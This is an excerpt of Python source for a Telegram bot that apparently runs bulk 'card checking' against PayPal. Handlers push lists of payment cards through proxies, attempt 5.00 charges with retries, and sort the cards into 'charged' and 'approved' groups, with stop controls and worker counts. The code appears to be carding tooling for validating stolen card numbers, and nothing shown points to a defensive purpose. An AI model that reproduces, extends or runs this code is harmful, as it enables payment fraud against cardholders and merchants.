        return await check_pp_with_retry(card, site_url, proxies, uid, max_retries=3, amount="5.00", cancel_check=lambda: ACTIVE_MPP_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    if from_inline or event.reply_to_msg_id:
        ACTIVE_MPP_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MPP_PROCESSES, "stop_pp", pp_check, "PayPal", "mpp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"pp_pref:yes:{uid}"), pbtn(bs("Only Charged"), f"pp_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>\n{PE} {bs('Site')}: <code>{site_url}</code>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"pp_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm, "site_url": site_url}


@client.on(events.CallbackQuery(pattern=rb"pp_pref:(yes|no):(\d+)"))
async def pp_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"pp_{uid}", None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    try: 
        await data["pref_msg"].delete()
    ...
    await event.answer(f"{bs('Starting')}...")
    proxies = data["proxies"]
    site_url = data.get("site_url", DEFAULT_PAYPAL_SITE)
    
    async def pp_check(card, http_session):
        return await check_pp_with_retry(card, site_url, proxies, uid, max_retries=3, amount="5.00", cancel_check=lambda: ACTIVE_MPP_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MPP_PROCESSES, "stop_pp", pp_check, "PayPal", "mpp"))


@client.on(events.CallbackQuery(pattern=rb"stop_pp:(\d+)"))
async def stop_pp_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MPP_PROCESSES.get(puid)
    if not proc: 
        return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
...
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)
{PE} <b>{bs('MPP Active')}:</b> <code>{len(ACTIVE_MPP_PROCESSES)}</code> ({MPP_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
